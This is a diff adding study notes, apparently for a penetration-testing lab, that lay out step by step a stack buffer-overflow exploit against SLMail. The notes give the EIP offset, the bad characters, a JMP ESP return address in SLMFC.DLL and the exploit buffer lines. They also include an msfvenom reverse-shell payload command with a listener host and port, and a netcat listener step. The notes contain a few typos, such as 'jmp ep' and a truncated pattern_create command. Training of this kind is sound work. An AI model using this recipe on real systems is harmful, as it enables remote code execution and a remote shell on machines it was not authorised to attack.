@@ -1,0 +1,91 @@
+
+
+BO stages (High Level View):
+
+Fuzzing
+#Use the fuzz script to identify how many characters it takes to crash (eg 2700)
+
+Basic Buffer
+#Now that you have identified it crashes within 2700 characters, you can now use this buffer to send 2700 A's to check that it overwrites ESP and EIP with the A's.
+
+Pattern Create
+#Use pattern create to locate exactly where EIP is overwritten
+
+cd /usr/share/metasploit-framework/tools/exploit -l 2700
+#replace the 2700 A's with the text output from pattern_create
+#Run this new script
+#Goto IDB and copy the numbers that are overwriting the EIP (eg 39694438)
+
+Pattern Offset
+cd /usr/share/metasploit-framework/tools/exploit
+./pattern_offset.rb -q <39694438>
+= 2606
+This means the location of the start of the EIP is 2606
+
+Padding
+#Use the padding script to ensure that the EIP is at the location identified by pattern_offset. Eg. If it is identified to start at 2606, then write 2606 A's, followed by 4 B's and 500 C's. This script will then result in your EIP being overwritten by 42424242 (4xB's) if sucessful.
+
+Badchars
+***Badchars script at the bottom***
+#Now that we have identified the EIP, we can overwrite the C's with our shellcode. But before we do that, we need to identify the bad characters. (eg \x00\x0a\x0d) etc. To do this simply replace the C's from the padding script to include all characters.
+#Once ran, follow the ESP in dump. The bad chars are identified where the hex does not run in sequence. Remove the badchar and repeat until the hex values all run in sequence.
+#In this example, \x00\x0a\x0d\ were all identified as bad characters and when removed the hex all runs in sequence. We are now ready to write our shellcode.
+
+JMPESP
+#By identifying the exact location of EIP, we now need to change that part in order to run our shellcode
+!mona modules - Identify memory locatins that aren't protected by ASLR or DEP, meaning they can be overwritten. In this demonstration, SLMFC.DLL is perfect
+#You now need to identify a jmpesp within SLMFC.DLL
+#Goto executable modules list 'e' logo. Locate SLMFC.DLL and doubleclick
+#This will open up SLMFC.DLL. You can now right click and search for command. Search for jmpesp
+#No item was found
+#Looking at the modules list in IDB ('m' logo) we can identify that within the SLMail modules, only the .txt section is marked as executable.
+#We now need to use nasm to identify the op code for jmp esp
+
+nasm
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm> jmp ep
+00000000  FFE4              jmp esp
+#The output from nasm reveals that the opcode for jmp esp is FFE4
+
+JMPESP
+#Search for FFE4 in SLMFC.DLL by using mona
+!mona find -s "\xff\xe4" -m slmfc.dll
+#This will return a total of 19 pointers. You must choose one without bad characters.
+5F4A358F - The first one is perfect.
+#Search IDB with 5F4A358F  - You are returned with a jmp exp instruction
+#If we redirect EIP to 5F4A358F a jmp esp instruction will be executed which will lead to our shellcode.
+#Modify your code to replace the 4 B's with 5F4A358F
+**NB** When you replace the 4b's with the jmpesp location it must be done so in LITTLE ENDIAN**
+Edit your script to include the jmpesp
+buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "C"*(3200-2606-4)
+#Before running the script, locate the memory address 5F4A358F in IDB and press F2 to set breakpoint.
+#Run jmpesp.py
+Run the script. IDB will pause execution of the program at the JMP ESP instruction. Verify this by following the ESP in dump.
+You will see that it has paused where the C's are located. This is where our shellcode will go!
+
+Shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.206 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+#In the example above, you will see that the badchars identified are set with the -b pipe
+buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3200-2606-4-16-351)
+#In the example above we have introduced NOPs (\x90) this ensures that our shellcode isnt overwritten in memory.
+Set a nc listener 443
+run new script
+
+badchars = (
+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
+"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
+"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
+"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
+"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
+"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
+"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
+"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
+"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
+"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
+"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
+"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+
